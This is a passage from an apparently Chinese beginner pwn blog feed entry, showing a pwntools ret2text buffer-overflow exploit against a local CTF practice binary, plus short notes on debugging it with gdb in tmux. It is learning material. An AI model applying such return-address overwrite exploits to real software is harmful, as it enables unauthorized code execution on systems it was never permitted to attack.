&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2text&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(sh,&lt;span class=&#34;string&#34;&gt;&amp;quot;b *0xf7e4c624&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;retaddress = &lt;span class=&#34;number&#34;&gt;0x804863a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload =  &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;108&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;  + p32(retaddress)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;运行的时候感觉不是到断点那里了,差了一些,但是可以一直往下n,还是差不多的&lt;/p&gt;
&lt;p&gt;需要输入的时候 切换到左边按一下回车,就发送过去了&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2022-10-11T08:49:11.000Z</updated>
    </entry>
</feed>
